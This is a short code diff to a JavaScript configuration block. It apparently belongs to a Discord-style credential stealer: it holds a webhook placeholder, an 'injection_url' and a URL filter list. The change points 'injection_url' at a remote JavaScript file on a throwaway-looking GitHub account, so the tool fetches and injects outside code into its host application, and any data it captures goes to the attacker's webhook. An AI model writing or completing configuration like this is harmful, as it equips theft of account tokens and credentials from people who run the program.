@@ -18,7 +18,7 @@ var config = {
     "embed-color": 16734976,
 
     creator: "VERT",
-    injection_url: "am",
+    injection_url: "https://raw.githubusercontent.com/asdgufbasdgufghbujasdhbjfasdhbju/oodkkdkdkdkdkdkdk/main/jdjdjjd.js",
     webhook: "%WEBHOOK%",
     Filter: {
         "urls": [
